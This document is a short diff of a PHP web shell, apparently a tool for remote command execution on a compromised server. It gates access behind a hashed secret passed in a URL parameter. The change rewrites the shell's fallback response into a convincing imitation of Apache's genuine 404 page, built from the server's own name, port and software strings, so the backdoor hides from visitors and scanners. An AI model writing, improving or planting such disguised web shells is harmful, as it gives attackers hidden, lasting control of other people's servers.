@@ -2,13 +2,14 @@
 if (!isset($_GET['h']) || !password_verify(urldecode(base64_decode($_GET['h'])), '$argon2i$v=19$m=65536,t=4,p=1$elFRN0pBbnRsL21hRGg4dw$No/IZ7OfyP9Wh8AYM6AYQkU7cfmPflEzGSQJEuXO4v4')) {
     http_response_code(404);
     exit("
-    <html>
-        <head><title>404 Forbidden</title></head>
-        <body bgcolor='white'>
-            <center><h1>404 Not Found</h1></center>
-            <hr><center>Apache/2.4.41 (Ubuntu)</center>
-        </body>
-    </html>");
+        <html>
+            <head><title>404 Not Found</title></head>
+            <body bgcolor='white'>
+                <h1>Not Found</h1>
+                The requested URL " . $_SERVER['SCRIPT_NAME'] . " was not found on this server.
+                <hr><i>Apache/" . $_SERVER['SERVER_SOFTWARE'] . " Server at " . $_SERVER['SERVER_NAME'] . " Port " . $_SERVER['SERVER_PORT'] . "</i>
+            </body>
+        </html>");
 }
 
 $SH_CONF = array(
@@ -192,7 +193,7 @@ function initShellConfig()
 
 if (isset($_GET["feature"])) {
 
-    $response = NULL;
+    $response = null;
 
     switch ($_GET["feature"]) {
         case "shell":
